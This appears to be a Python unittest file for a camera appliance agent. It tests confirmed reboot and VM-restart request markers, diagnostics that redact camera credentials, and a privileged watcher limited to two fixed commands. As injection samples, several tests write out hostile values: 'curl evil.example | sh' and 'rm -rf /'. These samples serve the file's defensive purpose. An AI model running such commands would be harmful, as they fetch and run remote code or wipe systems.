"""RDM4: reboot_appliance/restart_vms request-marker flow (commands.py),
richer diagnostics (VMS /health + CPU/memory/disk + redacted per-camera
summary), and the privileged watcher's marker-to-fixed-action dispatch
-- including proof that marker CONTENT is never executed, only its
`type` is ever consulted, and that dry-run mode never executes or
deletes anything (the mechanism CI uses to prove the mapping without
ever rebooting a host or touching Docker).
"""

import importlib.util
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from anyaicam_agent import commands
from anyaicam_agent.config import AgentConfig

# privileged_watcher.py is not part of the anyaicam_agent package (it's
# a separate, root-deployed script -- see its own docstring) so it's
# loaded directly by path rather than imported normally.
_WATCHER_PATH = Path(__file__).resolve().parents[1] / 'system' / 'privileged_watcher.py'
_spec = importlib.util.spec_from_file_location('privileged_watcher', _WATCHER_PATH)
watcher = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(watcher)


def _config(tmp_path):
    return AgentConfig(cloud_id='AIC-TEST', state_dir=str(tmp_path), config_dir=str(tmp_path), log_dir=str(tmp_path))


class PrivilegedActionCommandTests(unittest.TestCase):
    def test_reboot_without_confirmation_fails_and_writes_no_marker(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = _config(Path(tmp))
            status, result, error = commands.execute('reboot_appliance', {}, config)
        self.assertEqual(status, 'failed')
        self.assertIn('Confirmation', error)
        self.assertFalse(config.pending_actions_dir.exists())

    def test_restart_vms_without_confirmation_fails_and_writes_no_marker(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = _config(Path(tmp))
            status, result, error = commands.execute('restart_vms', {'confirmed': False}, config)
        self.assertEqual(status, 'failed')
        self.assertFalse(config.pending_actions_dir.exists())

    def test_reboot_with_confirmation_writes_exactly_the_expected_marker(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = _config(Path(tmp))
            status, result, error = commands.execute('reboot_appliance', {'confirmed': True}, config)
            marker = json.loads((config.pending_actions_dir / 'reboot.json').read_text())
        self.assertEqual(status, 'completed')
        self.assertEqual(marker['type'], 'reboot')
        self.assertEqual(marker['command_id'], result['marker_id'])
        self.assertEqual(set(marker), {'type', 'command_id', 'requested_at'})

    def test_restart_vms_with_confirmation_writes_exactly_the_expected_marker(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = _config(Path(tmp))
            status, result, error = commands.execute('restart_vms', {'confirmed': True}, config)
            marker = json.loads((config.pending_actions_dir / 'restart_vms.json').read_text())
        self.assertEqual(status, 'completed')
        self.assertEqual(marker['type'], 'restart_vms')
        self.assertEqual(set(marker), {'type', 'command_id', 'requested_at'})

    def test_marker_never_contains_command_or_shell_text(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = _config(Path(tmp))
            commands.execute('reboot_appliance', {'confirmed': True}, config)
            raw = (config.pending_actions_dir / 'reboot.json').read_text()
        self.assertNotIn('systemctl', raw)
        self.assertNotIn('docker', raw)
        self.assertNotIn('/bin/', raw)

    def test_unknown_commands_are_still_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = _config(Path(tmp))
            status, result, error = commands.execute('shell', {'command': 'rm -rf /'}, config)
        self.assertEqual(status, 'failed')
        self.assertIn('disabled', error.lower())


class DiagnosticsTests(unittest.TestCase):
    def test_includes_vms_health_when_reachable(self):
        response = MagicMock()
        response.read.return_value = b'{"status":"ok"}'
        response.__enter__.return_value = response
        with tempfile.TemporaryDirectory() as tmp, patch('urllib.request.urlopen', return_value=response):
            result = commands.diagnostics(_config(Path(tmp)))
        self.assertEqual(result['vms_health'], {'status': 'ok'})

    def test_vms_health_unreachable_is_reported_not_raised(self):
        with tempfile.TemporaryDirectory() as tmp, patch('urllib.request.urlopen', side_effect=OSError('refused')):
            result = commands.diagnostics(_config(Path(tmp)))  # must not raise
        self.assertEqual(result['vms_health']['status'], 'unreachable')

    def test_includes_cpu_memory_disk(self):
        with tempfile.TemporaryDirectory() as tmp, \
             patch.object(commands, '_cpu_percent', return_value=12.3), \
             patch.object(commands, '_memory_percent', return_value=45.6), \
             patch('urllib.request.urlopen', side_effect=OSError()):
            result = commands.diagnostics(_config(Path(tmp)))
        self.assertEqual(result['cpu'], 12.3)
        self.assertEqual(result['memory'], 45.6)
        self.assertIn('disk_capacity', result)
        self.assertIn('disk_used', result)

    def test_agent_service_marked_active(self):
        with tempfile.TemporaryDirectory() as tmp, patch('urllib.request.urlopen', side_effect=OSError()):
            result = commands.diagnostics(_config(Path(tmp)))
        self.assertEqual(result['agent_service'], 'active')

    def test_camera_summary_keeps_only_allowed_keys(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = _config(Path(tmp))
            config.cameras_file.parent.mkdir(parents=True, exist_ok=True)
            config.cameras_file.write_text(json.dumps([
                {'camera_number': 1, 'online': True, 'recording': True, 'analytics': False, 'last_error': None,
                 'ip': '192.168.1.50', 'mac_address': 'aa:bb:cc:dd:ee:ff', 'rtsp_url': 'rtsp://admin:hunter2@192.168.1.50',
                 'name': 'Front Door', 'id': 'cam-1'},
            ]))
            with patch('urllib.request.urlopen', side_effect=OSError()):
                result = commands.diagnostics(config)
        self.assertEqual(result['cameras'], [{'camera_number': 1, 'online': True, 'recording': True, 'analytics': False, 'last_error': None}])

    def test_no_credentials_ip_mac_rtsp_anywhere_in_diagnostics_output(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = _config(Path(tmp))
            config.cameras_file.parent.mkdir(parents=True, exist_ok=True)
            config.cameras_file.write_text(json.dumps([
                {'camera_number': 1, 'online': True, 'ip': '192.168.1.50', 'mac_address': 'aa:bb:cc:dd:ee:ff',
                 'rtsp_url': 'rtsp://admin:hunter2@192.168.1.50', 'password': 'hunter2', 'username': 'admin'},
            ]))
            with patch('urllib.request.urlopen', side_effect=OSError()):
                result = commands.diagnostics(config)
        serialized = json.dumps(result)
        for forbidden in ('192.168.1.50', 'aa:bb:cc:dd:ee:ff', 'hunter2', 'rtsp://', 'admin'):
            self.assertNotIn(forbidden, serialized)


class WatcherDispatchTests(unittest.TestCase):
    def test_dispatch_table_is_exactly_two_fixed_actions(self):
        self.assertEqual(watcher.DISPATCH, {
            'reboot': ['systemctl', 'reboot'],
            'restart_vms': ['docker', 'restart', 'anyaicam-vms'],
        })

    def _write_marker(self, tmp_path, marker):
        path = Path(tmp_path) / 'reboot.json'
        path.write_text(json.dumps(marker))
        return path

    def test_dry_run_never_executes_and_never_deletes(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write_marker(tmp, {'type': 'reboot', 'command_id': 'abc'})
            with patch.object(watcher.subprocess, 'run') as run:
                argv = watcher.process_marker(path, dry_run=True)
            run.assert_not_called()
            self.assertEqual(argv, ['systemctl', 'reboot'])
            self.assertTrue(path.exists())

    def test_real_run_executes_exactly_the_fixed_argv_for_reboot(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write_marker(tmp, {'type': 'reboot', 'command_id': 'abc'})
            with patch.object(watcher.subprocess, 'run') as run:
                watcher.process_marker(path, dry_run=False, grace_seconds=0, sleep=lambda s: None)
            run.assert_called_once_with(['systemctl', 'reboot'], check=False)
        self.assertFalse(path.exists())  # consumed

    def test_real_run_executes_exactly_the_fixed_argv_for_restart_vms(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / 'restart_vms.json'
            path.write_text(json.dumps({'type': 'restart_vms', 'command_id': 'xyz'}))
            with patch.object(watcher.subprocess, 'run') as run:
                watcher.process_marker(path, dry_run=False, grace_seconds=0, sleep=lambda s: None)
            run.assert_called_once_with(['docker', 'restart', 'anyaicam-vms'], check=False)

    def test_marker_extra_fields_never_reach_subprocess(self):
        """The core no-arbitrary-shell guarantee at the privileged layer:
        even a marker crafted with an extra 'command'/'argv' field
        (as if something upstream of this script were compromised)
        cannot change what gets executed -- only `type` is ever read."""
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write_marker(tmp, {
                'type': 'reboot', 'command_id': 'abc',
                'command': 'rm -rf /', 'argv': ['bash', '-c', 'curl evil.example | sh'],
            })
            with patch.object(watcher.subprocess, 'run') as run:
                watcher.process_marker(path, dry_run=False, grace_seconds=0, sleep=lambda s: None)
            run.assert_called_once_with(['systemctl', 'reboot'], check=False)

    def test_unknown_marker_type_is_ignored_and_left_in_place(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / 'weird.json'
            path.write_text(json.dumps({'type': 'shutdown', 'command_id': 'abc'}))  # not in DISPATCH
            with patch.object(watcher.subprocess, 'run') as run:
                result = watcher.process_marker(path, dry_run=False, grace_seconds=0, sleep=lambda s: None)
            run.assert_not_called()
            self.assertIsNone(result)
            self.assertTrue(path.exists())

    def test_malformed_marker_json_is_ignored_without_raising(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / 'broken.json'
            path.write_text('{not valid json')
            with patch.object(watcher.subprocess, 'run') as run:
                result = watcher.process_marker(path, dry_run=False)  # must not raise
            run.assert_not_called()
        self.assertIsNone(result)

    def test_missing_command_id_is_ignored(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write_marker(tmp, {'type': 'reboot'})
            with patch.object(watcher.subprocess, 'run') as run:
                result = watcher.process_marker(path, dry_run=False, grace_seconds=0, sleep=lambda s: None)
            run.assert_not_called()
        self.assertIsNone(result)

    def test_grace_period_cancelled_when_marker_deleted_during_wait(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write_marker(tmp, {'type': 'reboot', 'command_id': 'abc'})

            def fake_sleep(_seconds):
                path.unlink()  # simulates an operator/requester cancelling within the grace window

            with patch.object(watcher.subprocess, 'run') as run:
                result = watcher.process_marker(path, dry_run=False, grace_seconds=10, sleep=fake_sleep)
            run.assert_not_called()
        self.assertIsNone(result)

    def test_grace_period_cancelled_when_marker_superseded_by_new_command_id(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write_marker(tmp, {'type': 'reboot', 'command_id': 'abc'})

            def fake_sleep(_seconds):
                path.write_text(json.dumps({'type': 'reboot', 'command_id': 'DIFFERENT'}))

            with patch.object(watcher.subprocess, 'run') as run:
                result = watcher.process_marker(path, dry_run=False, grace_seconds=10, sleep=fake_sleep)
            run.assert_not_called()
        self.assertIsNone(result)

    def test_grace_period_proceeds_when_marker_unchanged(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write_marker(tmp, {'type': 'reboot', 'command_id': 'abc'})
            waited = []
            with patch.object(watcher.subprocess, 'run') as run:
                watcher.process_marker(path, dry_run=False, grace_seconds=10, sleep=waited.append)
            run.assert_called_once_with(['systemctl', 'reboot'], check=False)
        self.assertEqual(waited, [10])

    def test_main_processes_every_marker_in_pending_dir_dry_run(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / 'reboot.json').write_text(json.dumps({'type': 'reboot', 'command_id': 'a'}))
            (Path(tmp) / 'restart_vms.json').write_text(json.dumps({'type': 'restart_vms', 'command_id': 'b'}))
            with patch.object(watcher.subprocess, 'run') as run:
                exit_code = watcher.main(['--dry-run', '--pending-dir', tmp])
            run.assert_not_called()
            self.assertEqual(exit_code, 0)
            self.assertTrue((Path(tmp) / 'reboot.json').exists())
            self.assertTrue((Path(tmp) / 'restart_vms.json').exists())


if __name__ == '__main__':
    unittest.main()
